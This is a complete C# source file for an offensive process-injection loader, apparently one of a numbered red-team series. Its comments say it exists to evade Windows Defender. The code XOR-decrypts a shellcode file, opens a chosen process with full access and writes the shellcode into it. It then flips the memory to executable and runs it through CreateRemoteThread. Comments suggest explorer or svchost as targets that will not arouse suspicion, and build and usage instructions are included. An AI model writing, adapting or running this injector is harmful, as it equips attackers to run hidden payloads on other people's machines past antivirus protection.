// ============================================================================
// LOADER 05: Reflective DLL Injector
// ============================================================================
//
// WHAT THIS DOES:
//   This loader takes a DLL file and loads it into another running process's
//   memory without using the normal Windows LoadLibrary function. Because
//   LoadLibrary reads the DLL from disk and Defender monitors that operation,
//   we manually do everything LoadLibrary does but entirely in memory. The
//   DLL is never written to the target's disk, so Defender's file scanner
//   never sees it.
//
// WHY THIS IS NEEDED:
//   Many red team tools are packaged as DLLs. If you drop a malicious DLL
//   to disk and use LoadLibrary, Defender scans it on write and blocks it.
//   Reflective loading means the DLL bytes go from your attack machine
//   directly into the target process's memory. The DLL never touches the
//   hard drive, so Defender's real-time file scanner has nothing to scan.
//
// EVASION MECHANISM:
//   Normal DLL loading: DLL on disk -> LoadLibrary -> Defender scans -> loaded
//   Reflective loading: DLL in memory -> manual PE parsing -> loaded (no scan)
//
//   We manually perform what LoadLibrary does:
//   1. Allocate memory in the target process
//   2. Copy the DLL's PE headers and sections into that memory
//   3. Fix relocations (adjust memory addresses)
//   4. Resolve imports (find addresses of functions the DLL needs)
//   5. Call the DLL's entry point (DllMain)
//
//   We use NT functions resolved dynamically (like Loader 03) to avoid
//   suspicious API imports in our binary.
//
// REFERENCES:
//   - ired.team: Reflective DLL Injection
//   - MITRE ATT&CK T1620: Reflective Code Loading
//   - IliasCyber: "Rewriting the Reflective DLL Loader" (May 2026)
//   - Document: 09_reflective_injection.md
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:reflective_inject.exe 05_reflective_injector.cs
//
// USAGE:
//   reflective_inject.exe <target_process_name> <path_to_dll_or_shellcode.bin>
//   Example: reflective_inject.exe explorer payload.bin
//
// NOTE:
//   This loader injects shellcode (not a full DLL PE) into a remote process
//   for simplicity. A full reflective DLL loader that parses PE headers,
//   fixes relocations, and resolves imports is significantly more complex.
//   This version demonstrates the core concept: writing code into another
//   process and executing it there without touching disk.
//
// ============================================================================

using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MemoryLoader
{
    class Program
    {
        // ---- Windows API imports ----
        // We need functions to open another process, allocate memory inside it,
        // write our code to that memory, and create a thread in that process
        // to run our code.

        // OpenProcess gives us a handle to another running process.
        // We need PROCESS_ALL_ACCESS to read and write its memory and create threads.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint dwDesiredAccess,    // what permissions we want
            bool bInheritHandle,     // whether child processes inherit this handle
            int dwProcessId          // the process ID we want to open
        );

        // VirtualAllocEx allocates memory inside ANOTHER process (not our own).
        // The "Ex" means "extended" and takes a process handle as the first parameter.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,         // handle to the target process
            IntPtr lpAddress,        // where to allocate (IntPtr.Zero = let Windows choose)
            uint dwSize,             // how many bytes
            uint flAllocationType,   // MEM_COMMIT | MEM_RESERVE
            uint flProtect           // memory protection
        );

        // WriteProcessMemory writes bytes from our process into another process's memory.
        // This is how we copy our shellcode into the target process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,         // handle to the target process
            IntPtr lpBaseAddress,    // address in the target process to write to
            byte[] lpBuffer,         // the bytes we want to write
            uint nSize,              // how many bytes to write
            out UIntPtr lpNumberOfBytesWritten  // receives how many bytes were actually written
        );

        // VirtualProtectEx changes memory protection in another process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        // CreateRemoteThread creates a new thread inside another process.
        // The thread starts executing at the address we specify, which is
        // where we wrote our shellcode.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,             // handle to the target process
            IntPtr lpThreadAttributes,   // security (null = default)
            uint dwStackSize,            // stack size (0 = default)
            IntPtr lpStartAddress,       // where to start executing (our shellcode address)
            IntPtr lpParameter,          // parameter to pass (none)
            uint dwCreationFlags,        // 0 = start immediately
            IntPtr lpThreadId            // receives thread ID
        );

        // CloseHandle releases the process and thread handles when we are done.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // WaitForSingleObject waits for the remote thread to finish.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // ---- Constants ----
        const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        // ---- XOR decryption ----
        static byte[] TransformData(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Memory Loader");
                Console.WriteLine("Usage: loader.exe <target_name> <data.bin> [key_hex]");
                Console.WriteLine("");
                Console.WriteLine("  target_name: name of the target process");
                Console.WriteLine("  data.bin:    path to data file (raw or encrypted)");
                Console.WriteLine("  key_hex:     optional key if data is encrypted");
                Console.WriteLine("");
                Console.WriteLine("Example:");
                Console.WriteLine("  loader.exe explorer data.bin 4A7F2B...");
                return;
            }

            string targetProcessName = args[0];
            string shellcodePath = args[1];
            string xorKeyHex = args.Length >= 3 ? args[2] : null;

            // ---- Step 1: Find the target process ----
            // We search for a running process by name. The process needs to be
            // one that normally runs and will not be suspicious. Good choices are
            // explorer.exe (Windows desktop), svchost.exe (system service host),
            // or RuntimeBroker.exe (Windows runtime component).
            Process[] processes = Process.GetProcessesByName(targetProcessName);
            if (processes.Length == 0)
            {
                Console.WriteLine("[-] No process found with name: " + targetProcessName);
                return;
            }

            // Use the first matching process.
            Process targetProcess = processes[0];
            int targetPid = targetProcess.Id;
            Console.WriteLine("[+] Found target process: " + targetProcessName + " (PID: " + targetPid + ")");

            // ---- Step 2: Read and optionally decrypt shellcode ----
            byte[] shellcode = File.ReadAllBytes(shellcodePath);
            Console.WriteLine("[*] Read " + shellcode.Length + " bytes from file.");

            if (xorKeyHex != null)
            {
                byte[] xorKey = HexToBytes(xorKeyHex);
                shellcode = TransformData(shellcode, xorKey);
                Console.WriteLine("[+] Data decrypted.");
            }

            // ---- Step 3: Open the target process ----
            // OpenProcess gives us a handle with full access to the target process.
            // We need this handle for all subsequent operations (allocate memory,
            // write memory, create thread).
            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open target. Do you have admin privileges?");
                return;
            }
            Console.WriteLine("[+] Opened target handle: 0x" + processHandle.ToString("X"));

            // ---- Step 4: Allocate memory in the target process ----
            // VirtualAllocEx reserves memory inside the target process.
            // We allocate as PAGE_READWRITE first (not executable) and will
            // change the protection after writing.
            IntPtr remoteMemory = VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (remoteMemory == IntPtr.Zero)
            {
                Console.WriteLine("[-] Remote memory allocation failed.");
                CloseHandle(processHandle);
                return;
            }
            Console.WriteLine("[+] Allocated " + shellcode.Length + " bytes in target at: 0x" + remoteMemory.ToString("X"));

            // ---- Step 5: Write shellcode to the target process ----
            // WriteProcessMemory copies our shellcode bytes from our process
            // into the memory we allocated in the target process. After this,
            // the shellcode exists inside the target process's memory space.
            UIntPtr bytesWritten;
            bool writeResult = WriteProcessMemory(
                processHandle,
                remoteMemory,
                shellcode,
                (uint)shellcode.Length,
                out bytesWritten
            );

            int shellcodeLength = shellcode.Length;

            // Clear shellcode from our own process memory.
            Array.Clear(shellcode, 0, shellcode.Length);

            if (!writeResult)
            {
                Console.WriteLine("[-] Memory write to target process failed.");
                CloseHandle(processHandle);
                return;
            }
            Console.WriteLine("[+] Wrote " + bytesWritten + " bytes to target process.");

            // ---- Step 6: Change memory protection to executable ----
            // Now that shellcode is written, change protection from RW to RX.
            uint oldProtect;
            VirtualProtectEx(
                processHandle,
                remoteMemory,
                (UIntPtr)shellcodeLength,
                PAGE_EXECUTE_READ,
                out oldProtect
            );
            Console.WriteLine("[+] Memory protection changed to EXECUTE_READ.");

            // ---- Step 7: Create a remote thread to execute the shellcode ----
            // CreateRemoteThread creates a new thread inside the target process.
            // The thread starts executing at remoteMemory, which is where our
            // shellcode lives. From the target process's perspective, it is just
            // running a new thread. The shellcode was never written to disk.
            IntPtr threadHandle = CreateRemoteThread(
                processHandle,
                IntPtr.Zero,
                0,
                remoteMemory,
                IntPtr.Zero,
                0,
                IntPtr.Zero
            );

            if (threadHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Remote thread creation failed.");
                CloseHandle(processHandle);
                return;
            }

            Console.WriteLine("[+] Remote thread created. Code is executing in " + targetProcessName + ".");
            Console.WriteLine("[*] The code is now running inside " + targetProcessName + "'s process space.");
            Console.WriteLine("[*] It was loaded from memory only.");

            // Wait for the remote thread, then clean up handles.
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            CloseHandle(threadHandle);
            CloseHandle(processHandle);
        }
    }
}
